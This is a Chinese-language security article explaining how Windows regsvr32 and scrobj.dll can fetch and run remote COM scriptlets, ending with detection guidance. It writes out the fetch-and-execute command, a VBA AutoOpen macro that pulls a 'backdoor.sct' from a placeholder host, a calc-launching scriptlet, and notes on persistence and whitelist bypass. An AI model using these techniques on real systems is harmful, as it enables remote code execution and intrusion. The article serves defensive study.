## 0x00 概述

regsvr32是Windows系统提供的用来向系统注册/卸载控件的命令，攻击者可以利用此命令进行远程代码执行，此技术已被收纳入ATT&CK的Execution技术中。  

## 0×01 利用方法解析

在ATT&CK的Execution阶段中，可以利用regsvr32技术来实施，例如：

    
    
    cmd.exe /c regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll

可以实现下载file.sct并执行的目的。

regsvr32是Windows系统提供的用来向系统注册/卸载控件(如扩展名为DLL、OCX、CPL的文件)的命令，用法如下：

    
    
    regsvr32 [/u] [/s] [/n] [/i[:cmdline]] dllname
    /u -  解除服务器注册
    /s -  无声；不显示消息框
    /i -　调用 DllInstall，给其传递一个可选的 [cmdline]；跟/u一起使用时，卸载dll
    /n -　不调用DllRegisterServer；这个选项必须跟/i一起使用  
    

这个程序会修改系统注册表中的 HKEY_CLASSES_ROOT 和 HKEY_LOCAL_MACHINE。

其中，dll中包含组织好的COM组件，通过向系统注册，可以达到全局引用的效果。COM组件要包含唯一的uuid，当外部调用此COM组件时，系统通过uuid来找到相应的组件。除了uuid之外，COM组件还有progid属性。实践证明，uuid值必须保持唯一性，而progid值是可以重复的，progid与uuid可能类似于域名与IP地址的关系，Windows系统应该在内部维护了一张映射关系表。

再简单的介绍下COM组件。COM的全称是Component Object
Mode，是微软提出的中间件技术，以WIN32动态链接库（[DLL](https://baike.baidu.com/item/DLL)）或可执行文件（
[EXE](https://baike.baidu.com/item/EXE)）形式发布的可执行代码组成，可以给应用程序、操作系统以及其他组件提供服务。COM组件的载体一般是.dll、.ocx类型的可执行文件，regsvr32能够将COM组件注册，写入注册表中，可以利用这一点进行攻击。

我们剖析regsvr32命令的执行过程，下面命令的调用可以拆分为两部分：

    
    
    cmd.exe /c regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll

1) 调用scrobj.dll的DllInstall，并将URL参数传递过去（执行此命令的关键就在于对DllInstall的调用）；  

2) 调用regsvr32将COM组件写入注册表（此处用了/u，并不会真正写入注册表）；

之所以选择用regsvr32命令，是为了作为DllInstall的主调函数，并且regsvr32的调用不需要管理员权限。

查看scrobj.dll库，其导出函数如下：

![dll.png](https://image.3001.net/images/20191223/1577089778_5e007af26d264.png!small)

导出的DllInstall函数需要两个参数：false（卸载过的）和指向具有COM Scriplet的URL字符串的指针。

尝试在office的开发环境（VBA）中，直接引出该函数，也达到了远程代码执行的目的：

    
    
    Private Declare PtrSafe Function DllInstall Lib "scrobj.dll" (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
    
    Sub AutoOpen()
        DllInstall False, ByVal StrPtr("http://X.X.X.X:8080/backdoor.sct") ' False = "Don't install"
    End Sub  
    

执行效果为：

![clipboard.png](https://image.3001.net/images/20191223/1577090163_5e007c7382a44.png!small)其中，backdoor.sct的内容如下，即用JS编写的WSC：

    
    
    <?XML version="1.0"?>
    <component id="TESTING">
    <registration
      progid="TESTING"
      classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
      <script language="JScript">
        <![CDATA[
          var foo = new ActiveXObject("WScript.Shell").Run("calc.exe");
        ]]>
    </script>
    </registration>
    </component>  
    

使用JavaScript也可以编写COM组件，称为WSC（Windows Scripting
Component），.wsc文件是一种标准的XML文件。WSC的执行性能是不能与以.dll、.ocx等可执行的二进制文件为载体的COM相提并论的。因为脚本语言并不能被编译，而只能运行于宿主机中，Windows平台上的脚本宿主机是WSH（Windows
Scripting Host），即WINDOWS\system32\scrobj.dll。调用WSC，实际上会调用WSH、再由WSH执行脚本程序。

渗透测试软件Metasploit、Empire等都支持regsvr32的利用方式。

进阶持久化利用：

1) 使用 /s 将WSC写入注册表，但是这种容易被检测出来；

2) 调用 srcobj.dll 中的 DllInstall 导出函数，将恶意文件下载到本地（封装成DLL文件），伪装成临时文件（如“％appdata％
Microsoft Word”中的.asd文件），实时进行调用。

使用regsvr32的优点：  

1) 普通权限即可执行；

2) 能够绕过大部分的DLL白名单。

使用regsvr32的缺陷：  

1) 只能达到远程利用的效果;

2) regsvr32的执行日志会暴露 /i 选项中的URL连接。

## 0×02 检测思路

监控regsvr32.exe的执行和所带参数，以提取其可能的异常行为，分析regsvr32.exe的命令行参数中出现的脚本、DLL的来源和功能。也可以监控进程调用的子模块进行综合判定，例如如下的规则可以识别出异常行为，但要小心误报。

process_name:regsvr32.exe (modload:jscript.dll OR modload:vbscript.dll)
modload:scrobj.dll

## 0×03 参考链接

[ATT&CK, regsvr32](https://attack.mitre.org/techniques/T1117/)  

[How to use the regsvr32 tool and troubleshoot regsvr32 error
messages](https://support.microsoft.com/en-us/help/249873/how-to-use-the-regsvr32-tool)

[Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS
Tools to “Live off the Land”](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/)  

[A regsvr32 hack is all it takes to bypass Windows' AppLocker
security](https://betanews.com/2016/04/25/bypass-applocker-security/)  

[用JavaScript制作COM组件](https://www.toolmao.com/javascript-make-com)  

[在VBA中使用DLL改善宏的攻击功能](https://www.4hou.com/technology/4831.html)

